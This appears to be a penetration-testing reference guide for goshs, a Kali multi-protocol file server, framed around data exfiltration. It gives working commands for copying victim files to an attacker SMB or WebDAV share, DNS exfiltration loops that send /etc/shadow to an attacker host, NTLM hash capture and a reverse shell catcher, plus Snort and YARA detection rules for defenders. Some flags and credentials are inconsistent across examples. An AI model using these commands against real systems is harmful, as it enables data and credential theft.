---
tool_name: "goshs"
display_name: "goshs"
mitre_tactic: "exfiltration"
mitre_tactic_id: "TA0010"
mitre_technique: "T1048 - Exfiltration Over Alternative Protocol"
mitre_technique_id: "T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
install_command: "sudo apt install goshs"
version: "2.1.0"
github_repo: "https://github.com/patrickhener/goshs"
kali_tools_page: "https://www.kali.org/tools/goshs/"
difficulty_level: "beginner"
requires_root: false
gui_available: false
tags: ["exfiltration", "smb", "http", "webdav", "ftp", "ldap", "data-transfer", "file-server", "go"]
related_tools: ["impacket-smbserver", "raven", "smbclient", "smbmap", "Responder"]
---

# goshs — Go Simple HTTP Server with SMB, FTP, and Multi-Protocol Support

## What This Tool Does (in 30 seconds)

goshs is a Go-based multi-protocol file server that extends Python's SimpleHTTPServer concept with SMB, FTP/SFTP, WebDAV, LDAP, DNS, and SMTP capabilities. For exfiltration, its built-in SMB server lets you stand up a file share on the fly, pull data off a target, or push collected files to your attack infrastructure -- all with authentication, TLS, and logging built in.

---

## Chapter 1: Introduction & Overview

### What is goshs?

goshs (Go Simple HTTP Server) is a lightweight, single-binary file server written in Go. It started as a security-hardened replacement for `python3 -m http.server` and evolved into a multi-protocol Swiss Army knife. The tool bundles HTTP, WebDAV, SMB, FTP/SFTP, LDAP (including JNDI exploitation), DNS, and SMTP servers into one binary. For penetration testers and incident responders, it solves the core exfiltration problem: getting files off a target quickly without heavy dependencies.

### Key Features

- HTTP server with directory listing, upload, and clipboard sharing
- SMB server with configurable domain, share name, and hash cracking
- WebDAV support for Windows-native file transfers
- FTP and SFTP server modes
- LDAP credential capture server with JNDI exploitation support
- Built-in DNS and SMTP servers for lab/simulation work
- TLS with self-signed certs, custom certs, or Let's Encrypt
- Basic auth, certificate auth, and IP whitelisting
- Webhook notifications (Discord, Slack, Mattermost)
- YAML configuration file support
- Reverse shell catcher mode
- mDNS/Bonjour registration
- Single Go binary -- no runtime dependencies

### History & Background

- **Author:** Patrick Hener (patrickhener)
- **Language:** Go (compiled to single binary)
- **License:** MIT
- **Repository:** github.com/patrickhener/goshs
- **Kali Package:** goshs (version 2.1.0)
- **First Released:** 2020
- **Purpose:** Secure, multi-protocol file server for pentesting, IR, and exfiltration

### When to Use goshs

- **Data exfiltration** -- Set up an SMB share to pull files off a compromised host
- **File staging** -- Stage collected data for later retrieval
- **Credential capture** -- Use the LDAP server to capture NTLM hashes
- **JNDI exploitation** -- Trigger Log4Shell-style JNDI lookups
- **Red team ops** -- Host payloads with authentication and logging
- **Incident response** -- Provide a file collection endpoint for remote machines
- **Lab environments** -- Simulate DNS, SMTP, and SMB infrastructure

### When NOT to Use This Tool

- Without explicit authorization from the target organization
- On production networks without change management approval
- When a simpler tool (like `python3 -m http.server`) suffices and simplicity reduces detection surface
- When the target environment requires SMBv3 encryption and goshs only supports SMBv2

### Legal and Ethical Considerations

- Only exfiltrate data from systems you own or have written authorization to test
- SMB traffic on non-standard ports may trigger IDS alerts -- document your authorization
- Credential capture (LDAP server) logs plaintext passwords -- handle with care
- TLS should be used for any exfiltration over public networks
- Keep logs of all file transfers for accountability

### Key Concepts

- **SMB (Server Message Block):** Windows file sharing protocol; goshs implements SMBv2
- **Exfiltration:** The act of moving collected data from a target to attacker-controlled infrastructure
- **WebDAV:** HTTP-based file access protocol; useful when SMB ports are blocked
- **NTLM Hash Capture:** Intercepting authentication hashes during SMB/LDAP connections
- **JNDI (Java Naming and Directory Interface):** Java API for directory services; exploited via Log4Shell
- **Basic Auth:** HTTP authentication using Base64-encoded username:password
- **Self-signed Certificate:** A TLS certificate not signed by a CA; browsers warn on it but it encrypts traffic

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Any Linux distribution (Kali, Ubuntu, Debian, etc.)
- **RAM:** 50 MB minimum (Go binaries are efficient)
- **Disk Space:** 22 MB installed
- **Privileges:** Not required for basic operation; root needed only for ports below 1024 or SMB on port 445
- **Dependencies:** libc6 (statically linked Go binary)

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install goshs
```

Verify installation:

```bash
goshs -v
# Output: goshs v2.1.0
```

#### Method 2: From GitHub Releases

Download the latest binary from GitHub releases:

```bash
wget https://github.com/patrickhener/goshs/releases/latest/download/goshs-linux-amd64
chmod +x goshs-linux-amd64
sudo mv goshs-linux-amd64 /usr/local/bin/goshs
```

#### Method 3: Build from Source

```bash
git clone https://github.com/patrickhener/goshs.git
cd goshs
go build -o goshs .
sudo mv goshs /usr/local/bin/
```

### Initial Configuration

Generate a sample config file:

```bash
goshs -P > goshs-config.yaml
```

This produces a YAML file you can customize:

```yaml
web:
  ip: "0.0.0.0"
  port: 8000
  dir: "."
  silent: false
  invisible: false

tls:
  enabled: false
  selfsigned: true

smb:
  enabled: true
  port: 445
  domain: "WORKGROUP"
  share: "data"

auth:
  basic: "admin:$3cur3P@ss"

logging:
  output: true
  logfile: "/var/log/goshs.log"
```

### Directory Structure

```
goshs/
├── goshs              # Binary
├── goshs-config.yaml  # Configuration file
├── uploads/           # Default upload directory
└── logs/              # Log output directory
```

---

## Chapter 3: Basic Usage

### Complete Flag Reference

#### Web Server Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-i` | `--ip` | IP or interface to listen on | 0.0.0.0 |
| `-p` | `--port` | Port to listen on | 8000 |
| `-d` | `--dir` | Web root directory | current dir |
| `-w` | `--webdav` | Enable WebDAV | false |
| `-wp` | `--webdav-port` | WebDAV listen port | 8001 |
| `-ro` | `--read-only` | Disable uploads | false |
| `-uo` | `--upload-only` | Disable downloads | false |
| `-uf` | `--upload-folder` | Custom upload folder | current dir |
| `-mu` | `--max-upload` | Max upload size (bytes, 0=unlimited) | 0 |
| `-nc` | `--no-clipboard` | Disable clipboard sharing | false |
| `-nd` | `--no-delete` | Disable delete option | false |
| `-si` | `--silent` | No directory listing | false |
| `-I` | `--invisible` | Invisible mode (no UI) | false |
| `-c` | `--cli` | Enable CLI (requires auth+tls) | false |
| `-rc` | `--catcher` | Enable reverse shell catcher | false |
| `-e` | `--embedded` | Show embedded files in UI | false |
| `-o` | `--output` | Write output to logfile | false |
| `-t` | `--tunnel` | Enable tunnel | false |

#### TLS Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-s` | `--ssl` | Enable TLS | false |
| `-ss` | `--self-signed` | Use self-signed certificate | false |
| `-sk` | `--server-key` | Path to server key | none |
| `-sc` | `--server-cert` | Path to server cert | none |
| `-p12` | `--pkcs12` | Path to PKCS12 bundle | none |
| `-p12np` | `--p12-no-pass` | PKCS12 has empty password | false |
| `-sl` | `--lets-encrypt` | Use Let's Encrypt | false |
| `-sld` | `--le-domains` | Domains for Let's Encrypt | none |
| `-sle` | `--le-email` | Email for Let's Encrypt | none |
| `-slh` | `--le-http` | HTTP challenge port | 80 |
| `-slt` | `--le-tls` | TLS ALPN challenge port | 443 |

#### SMB Server Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-smb` | `--smb` | Enable SMB server | false |
| | `--smb-port` | SMB listen port | 445 |
| | `--smb-domain` | SMB domain | WORKGROUP |
| | `--smb-share` | SMB share name | goshs |
| | `--smb-wordlist` | Wordlist for hash cracking | none |

#### FTP/SFTP Server Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-ftp` | | Enable FTP/SFTP server | false |
| | `--ftp-port` | FTP listen port | 2121 |
| | `--ftp-sftp` | Switch to SFTP mode | false |
| `-fkf` | `--ftp-keyfile` | Authorized keys for SFTP | none |
| `-fhk` | `--ftp-host-keyfile` | SSH host key for SFTP | none |

#### LDAP Server Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-ldap` | `--ldap-server` | Enable LDAP capture server | false |
| | `--ldap-port` | LDAP listen port | 389 |
| | `--ldap-jndi` | Enable JNDI mode | false |
| | `--ldap-jndi-base` | Override JNDI codeBase URL | auto |
| | `--ldap-wordlist` | Wordlist for NTLM hash cracking | none |

#### Authentication Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-b` | `--basic-auth` | Basic auth (user:pass) | none |
| `-ca` | `--cert-auth` | Certificate-based auth | none |
| `-H` | `--hash` | Hash a password for ACLs | none |

#### Connection Restriction Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-ipw` | `--ip-whitelist` | Comma-separated IP whitelist | none |
| `-tpw` | `--trusted-proxy-whitelist` | Trusted proxy whitelist | none |

#### Collaboration Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-dns` | `--dns-server` | Enable DNS server | false |
| | `--dns-port` | DNS listen port | 8053 |
| | `--dns-ip` | DNS reply IP | 127.0.0.1 |
| `-smtp` | `--smtp-server` | Enable SMTP server | false |
| | `--smtp-port` | SMTP listen port | 2525 |
| | `--smtp-domain` | SMTP domain | open relay |

#### Webhook Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-W` | `--webhook` | Enable webhook support | false |
| `-Wu` | `--webhook-url` | Webhook URL | none |
| `-We` | `--webhook-events` | Events to notify | all |
| `-Wp` | `--webhook-provider` | Provider (Discord/Slack/Mattermost) | Discord |

#### Misc Flags

| Flag | Long Flag | Description | Default |
|------|-----------|-------------|---------|
| `-C` | `--config` | Config file path | false |
| `-P` | `--print-config` | Print sample config | false |
| `-u` | `--user` | Drop privileges to user | current |
| `-V` | `--verbose` | Verbose logging | false |
| `-v` | | Print version | -- |
| `-m` | `--mdns` | Enable mDNS registration | false |

### Scenario 1: Basic HTTP File Server

Start a simple file server on port 8000:

```bash
goshs
```

Sample output:

```
goshs v2.1.0
Starting web server on 0.0.0.0:8000
Serving directory: /home/user
```

Access from a browser at `http://KALI_IP:8000`.

### Scenario 2: SMB Exfiltration Server

Start an SMB server to pull files from a Windows target:

```bash
sudo goshs -smb --smb-port 445 --smb-share loot
```

Sample output:

```
goshs v2.1.0
Starting SMB server on 0.0.0.0:445
Share name: loot
Domain: WORKGROUP
Ready for connections...
```

On the Windows target:

```cmd
net use \\KALI_IP\loot
copy C:\Users\victim\Desktop\passwords.xlsx \\KALI_IP\loot\
net use \\KALI_IP\loot /delete
```

### Scenario 3: Authenticated Upload Server

Start an HTTP server with basic auth and upload-only mode:

```bash
goshs -p 8080 -uo -uf /tmp/exfil -b 'analyst:Str0ngP@ss!'
```

Clients upload via browser or curl:

```bash
curl -u "analyst:Str0ngP@ss!" -F "file=@sensitive_data.zip" http://KALI_IP:8080/upload
```

### Scenario 4: TLS-Encrypted SMB with Auth

Start a self-signed TLS SMB server with basic auth:

```bash
goshs -s -ss -b 'team:ops2024' -smb --smb-share classified
```

### Scenario 5: Capture NTLM Hashes via LDAP

Start the LDAP server to capture NTLM hashes:

```bash
goshs -ldap --ldap-port 389 -o -V
```

When a Windows client authenticates, the NTLM hash is captured and optionally cracked against a wordlist.

---

## Chapter 4: Intermediate Usage & Automation

### Scripting Exfiltration Workflows

#### Automated SMB Exfiltration with Logging

```bash
#!/bin/bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
EXFIL_DIR="/tmp/exfil_${TIMESTAMP}"
LOG_FILE="/var/log/goshs_exfil_${TIMESTAMP}.log"

mkdir -p "$EXFIL_DIR"

echo "[*] Starting goshs SMB server..."
echo "[*] Exfil directory: $EXFIL_DIR"
echo "[*] Log file: $LOG_FILE"

goshs \
  -smb \
  --smb-port 445 \
  --smb-share exfil \
  -d "$EXFIL_DIR" \
  -o \
  -V \
  2>&1 | tee "$LOG_FILE" &

GOSHS_PID=$!
echo "[*] goshs PID: $GOSHS_PID"
echo "[*] Press Ctrl+C to stop"
wait $GOSHS_PID
```

#### Multi-Protocol Exfiltration Server

```bash
#!/bin/bash
# Start HTTP, SMB, and FTP servers simultaneously
goshs -p 8080 -d /tmp/staging -uo -uf /tmp/staging &
HTTP_PID=$!

sudo goshs -smb --smb-port 445 --smb-share loot -d /tmp/staging &
SMB_PID=$!

goshs -ftp --ftp-port 2121 &
FTP_PID=$!

echo "HTTP PID: $HTTP_PID"
echo "SMB PID: $SMB_PID"
echo "FTP PID: $FTP_PID"

# Cleanup function
cleanup() {
    kill $HTTP_PID $SMB_PID $FTP_PID 2>/dev/null
    echo "[*] All servers stopped."
}

trap cleanup EXIT
wait
```

#### Using goshs with Responder for NTLM Capture

```bash
# Terminal 1: Start goshs SMB server to capture hashes
goshs -smb --smb-port 445 --smb-share files -smb-wordlist /usr/share/wordlists/rockyou.txt -o -V

# Terminal 2: Monitor captured hashes
tail -f /var/log/goshs.log
```

#### Webhook Notifications for Exfil Events

```bash
# Notify a Slack channel when files are uploaded
goshs \
  -p 8080 \
  -uo \
  -uf /tmp/exfil \
  -W \
  -Wu "https://hooks.slack.com/services/T00/B00/xxxx" \
  -Wp Slack \
  -We "upload"
```

### Integration with Other Tools

#### Exfiltrate to goshs via Impacket

```bash
# Terminal 1: Start goshs SMB server
sudo goshs -smb --smb-share loot -d /tmp/staging

# Terminal 2: Use impacket to copy files to goshs
impacket-smbclient user:password@target -c "get C:\Users\victim\secrets.txt"
```

#### Exfiltrate via WebDAV

```bash
# Start goshs with WebDAV
goshs -w -wp 8001 -d /tmp/staging -uo -uf /tmp/staging

# From Windows target
net use https://KALI_IP:8001
copy C:\data\*.xlsx https://KALI_IP:8001/
```

---

## Chapter 5: Advanced Usage

### Custom YAML Configuration

Create a full configuration file:

```yaml
# goshs-config.yaml - Production exfiltration server
web:
  ip: "10.10.14.5"
  port: 8080
  dir: "/opt/exfil/staging"
  silent: true
  invisible: true
  read_only: false
  upload_only: true
  upload_folder: "/opt/exfil/incoming"
  max_upload: 0
  no_clipboard: true
  no_delete: true
  output: true
  logfile: "/var/log/goshs_web.log"

tls:
  enabled: true
  selfsigned: false
  server_key: "/etc/goshs/server.key"
  server_cert: "/etc/goshs/server.crt"

smb:
  enabled: true
  port: 445
  domain: "CORP"
  share: "exfil"
  wordlist: "/usr/share/wordlists/rockyou.txt"

ftp:
  enabled: true
  port: 2121
  sftp: true
  host_keyfile: "/etc/ssh/ssh_host_rsa_key"
  keyfile: "/root/.ssh/authorized_keys"

ldap:
  enabled: true
  port: 389
  jndi: false
  wordlist: "/usr/share/wordlists/rockyou.txt"

auth:
  basic: "ops:$2a$14$BcryptHashHere"

ip_whitelist:
  - "10.10.10.100"
  - "10.10.14.50"

webhook:
  enabled: true
  url: "https://hooks.slack.com/services/T00/B00/xxxx"
  provider: "Discord"
  events:
    - "upload"
    - "download"

dns:
  enabled: true
  port: 53
  ip: "127.0.0.1"

smtp:
  enabled: true
  port: 2525
  domain: "exfil.local"
```

Start with config:

```bash
goshs -C /etc/goshs/goshs-config.yaml
```

### Covert Channel: DNS Exfiltration via goshs

goshs has a built-in DNS server. Combined with the HTTP server, you can set up a DNS-based exfiltration channel:

```bash
# Start goshs with DNS server
goshs \
  -p 8080 \
  -dns \
  --dns-port 53 \
  --dns-ip 10.10.14.5 \
  -d /tmp/dns_exfil

# On the target, encode data as DNS queries
# Example: exfiltrate a file by encoding each byte as a hex DNS query
xxd -p /etc/shadow | tr -d '\n' | fold -w 60 | while read chunk; do
    nslookup "${chunk}.exfil.attacker.com" 10.10.14.5
    sleep 0.5
done
```

### Reverse Shell Catcher

```bash
# Start goshs with reverse shell catcher
goshs -rc -p 8080 -b 'admin:pass' -s -ss -o -V

# When a reverse shell connects, goshs catches it and logs output
```

### Privilege Dropping

```bash
# Start as root, drop to www-data after binding to port 445
sudo goshs -smb --smb-port 445 -u www-data --smb-share files
```

### Shell Tab Completion

```bash
# Install tab completion for bash
goshs --completion bash >> ~/.bashrc
source ~/.bashrc

# For zsh
goshs --completion zsh >> ~/.zshrc
source ~/.zshrc
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Penetration Test -- Data Exfiltration from Windows Domain

**Objective:** Extract sensitive files from a compromised Windows workstation to your Kali machine.

**Setup:**

```bash
# On Kali (attacker machine)
sudo goshs -smb --smb-port 445 --smb-share loot -d /tmp/exfil -o -V
```

**Execution from compromised Windows host:**

```cmd
:: Map the goshs share
net use L: \\10.10.14.5\loot /user:guest ""

:: Copy sensitive files
copy C:\Users\victim\Documents\passwords.xlsx L:\
copy C:\Users\victim\Desktop\financial_report.docx L:\
xcopy /s /e C:\Users\victim\Downloads L:\downloads\

:: Disconnect
net use L: /delete
```

**Verification:**

```bash
ls -la /tmp/exfil/
# Verify files were received
file /tmp/exfil/passwords.xlsx
```

### Scenario 2: Incident Response -- File Collection from Multiple Machines

**Objective:** Collect forensic artifacts from multiple compromised servers.

**Setup:**

```bash
# Start goshs with authenticated upload server
goshs \
  -p 443 \
  -uo \
  -uf /tmp/ir_collection \
  -b 'ir-team:$ecur3C0llect' \
  -s -ss \
  -o \
  -V \
  --organize-uploads
```

**On each compromised machine:**

```bash
# Linux target
curl -k -u "ir-team:secur3Collect" \
  -F "file=@/var/log/auth.log" \
  -F "file=@/etc/passwd" \
  https://10.10.14.5:443/upload

# Windows PowerShell target
$cred = New-Object System.Management.Automation.PSCredential("ir-team", (ConvertTo-SecureString "secur3Collect" -AsPlainText -Force))
Invoke-WebRequest -Uri "https://10.10.14.5:443/upload" -Method POST -InFile "C:\Windows\Temp\artifacts.zip" -Credential $cred -SkipCertificateCheck
```

### Scenario 3: Red Team -- Covert Exfiltration with WebDAV and TLS

**Objective:** Exfiltrate data using WebDAV (less likely to be blocked than SMB) over TLS.

**Setup:**

```bash
# Generate a Let's Encrypt cert for your domain
goshs \
  -w -wp 8001 \
  -s -sl \
  -sle redteam@corp.com \
  -sld files.corp-redteam.com \
  -d /tmp/staging \
  -uo \
  -uf /tmp/staging \
  -b 'redteam:$up3r$3cur3' \
  -ipw "10.10.10.0/24" \
  -o
```

**From compromised host:**

```cmd
:: Map WebDAV share
net use W: https://files.corp-redteam.com:8001 /user:redteam "sup3r$ecur3"

:: Copy data
copy C:\classified\project_alpha.docx W:\
copy C:\classified\budget_2024.xlsx W:\

:: Disconnect
net use W: /delete
```

### Scenario 4: Lab Environment -- Capture NTLM Hashes

**Objective:** Set up a fake SMB share to capture NTLM hashes from misconfigured hosts.

```bash
# Start goshs SMB server with wordlist for auto-cracking
sudo goshs -smb --smb-port 445 --smb-share public \
  -smb-wordlist /usr/share/wordlists/rockyou.txt \
  -o -V

# When a client connects, NTLM hashes are logged and optionally cracked
```

### Scenario 5: Covert DNS Exfiltration

**Objective:** Exfiltrate small files over DNS when all other protocols are blocked.

```bash
# On Kali
goshs \
  -p 8080 \
  -dns \
  --dns-port 53 \
  --dns-ip 10.10.14.5 \
  -d /tmp/dns_exfil \
  -o -V

# On the target, exfiltrate via DNS queries
HOSTNAME=$(hostname)
DATA=$(base64 /etc/shadow | tr -d '\n')
CHUNK_SIZE=50

for ((i=0; i<${#DATA}; i+=CHUNK_SIZE)); do
    CHUNK="${DATA:$i:$CHUNK_SIZE}"
    nslookup "${HOSTNAME}.${CHUNK}.exfil.local" 10.10.14.5
    sleep 1
done
```

---

## Chapter 7: Detection & Defense

### Detection Signatures

#### Snort/Suricata Rules

```
# Detect goshs SMB server on non-standard port
alert tcp any any -> $HOME_NET 445 (
    msg:"goshs SMB Server Detected";
    flow:to_server,established;
    content:"SMB";
    depth:4;
    sid:1000001;
    rev:1;
)

# Detect goshs WebDAV upload
alert http any any -> $HOME_NET any (
    msg:"goshs WebDAV Upload Detected";
    flow:to_server,established;
    content:"PUT";
    http_method;
    content:"Content-Type: application/octet-stream";
    http_header;
    sid:1000002;
    rev:1;
)

# Detect goshs HTTP upload
alert http any any -> $HOME_NET any (
    msg:"goshs HTTP File Upload";
    flow:to_server,established;
    content:"POST";
    http_method;
    content:"multipart/form-data";
    http_header;
    sid:1000003;
    rev:1;
)

# Detect DNS exfiltration pattern (high query volume)
alert dns any any -> any 53 (
    msg:"Potential DNS Exfiltration - High Query Volume";
    dns.query;
    pcre:"/[a-zA-Z0-9]{40,}\./";
    threshold:type both, track by_src, count 50, seconds 60;
    sid:1000004;
    rev:1;
)
```

#### YARA Rules

```
rule goshs_smb_indicator {
    meta:
        description = "Detects goshs SMB server traffic patterns"
        author = "Security Team"
        date = "2024-01-01"
    strings:
        $smb1 = "goshs" ascii
        $smb2 = "SMB" ascii
        $smb3 = "WORKGROUP" ascii
    condition:
        $smb1 and ($smb2 or $smb3)
}

rule goshs_web_upload {
    meta:
        description = "Detects goshs web upload activity"
    strings:
        $upload = "multipart/form-data" ascii
        $server = "goshs" ascii
    condition:
        $upload and $server
}
```

### Log Analysis

```bash
# Monitor goshs logs for exfil activity
tail -f /var/log/goshs.log | grep -E "upload|download|smb|connect"

# Check for large transfers
grep -E "upload|POST" /var/log/goshs.log | awk '{print $NF}' | sort | uniq -c | sort -rn

# Detect unusual ports
ss -tlnp | grep -E "445|8080|8001|2121|389"
```

### Defensive Measures

1. **Network segmentation** -- Block SMB (445), FTP (2121), and LDAP (389) ports between user segments and the internet
2. **IDS/IPS deployment** -- Deploy Snort/Suricata rules for goshs traffic patterns
3. **DNS monitoring** -- Monitor for high-volume DNS queries to unknown domains (exfiltration indicator)
4. **Web proxy inspection** -- Inspect HTTP uploads for large file transfers
5. **Endpoint detection** -- Monitor for new SMB shares or FTP connections from workstations
6. **Certificate pinning** -- Do not trust self-signed certificates for production traffic

---

## Chapter 8: Troubleshooting

### Common Issues and Solutions

#### Port 445 Already in Use

```bash
# Error: bind: address already in use
# Solution: Find and kill the process using port 445
sudo lsof -i :445
sudo kill <PID>

# Or use a different port
goshs -smb --smb-port 4445 --smb-share loot
```

#### SMB Connection Refused

```bash
# Check if SMB is enabled
sudo goshs -smb --smb-port 445 --smb-share test -V

# Verify firewall rules
sudo iptables -L -n | grep 445
sudo ufw status

# Allow port through firewall
sudo ufw allow 445/tcp
```

#### TLS Certificate Errors

```bash
# Generate a self-signed certificate manually
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes

# Start goshs with custom cert
goshs -s -sk server.key -sc server.crt
```

#### LDAP Server Not Capturing Hashes

```bash
# Ensure LDAP port is not in use
sudo lsof -i :389

# Use a non-privileged port
goshs -ldap --ldap-port 1389

# Verify the client is connecting to the right port
```

#### goshs Won't Start as Non-Root on Port 445

```bash
# Port 445 requires root privileges
# Option 1: Run as root
sudo goshs -smb --smb-port 445

# Option 2: Use a high port
goshs -smb --smb-port 4445

# Option 3: Use capabilities (Linux)
sudo setcap 'cap_net_bind_service=+ep' /usr/bin/goshs
goshs -smb --smb-port 445
```

#### WebDAV Client Can't Connect

```bash
# Ensure WebDAV is enabled
goshs -w -wp 8001

# On Windows, enable WebDAV client
sc start webclient

# Map the WebDAV share
net use W: http://KALI_IP:8001
```

### Debugging

```bash
# Enable verbose logging
goshs -V -o

# Check logs
tail -f /var/log/goshs.log

# Test SMB connectivity
smbclient -L //localhost -N

# Test HTTP connectivity
curl -v http://localhost:8080/

# Test LDAP server
ldapsearch -x -H ldap://localhost -b ""
```

---

## Resources

### Official Documentation

- **goshs GitHub:** https://github.com/patrickhener/goshs
- **goshs Wiki:** https://github.com/patrickhener/goshs/wiki
- **Kali Tools Page:** https://www.kali.org/tools/goshs/
- **Go Documentation:** https://go.dev/doc/

### Related MITRE ATT&CK Techniques

- **T1048.002** -- Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- **T1048.003** -- Exfiltration Over Unencrypted Non-C2 Protocol
- **T1021.002** -- Remote Services: SMB/Windows Admin Shares
- **T1572** -- Protocol Tunneling
- **T1557** -- Adversary-in-the-Middle (for credential capture)

### Related Tools

- **impacket-smbserver** -- Python-based SMB server with full protocol support
- **raven** -- HTTP file upload server
- **smbclient** -- SMB client for connecting to shares
- **Responder** -- LLMNR/NBT-NS/MDNS poisoner for credential capture
- **smbmap** -- SMB share enumeration tool

### Books and References

- "The Hacker Playbook 3" -- Practical penetration testing techniques
- "Penetration Testing" by Georgia Weidman
- MITRE ATT&CK Framework: https://attack.mitre.org/
- NIST SP 800-86: Guide to Integrating Forensic Techniques

---

*Last updated: 2026-07-20*
*goshs version: 2.1.0*
*Kali Linux version: 2026.x*
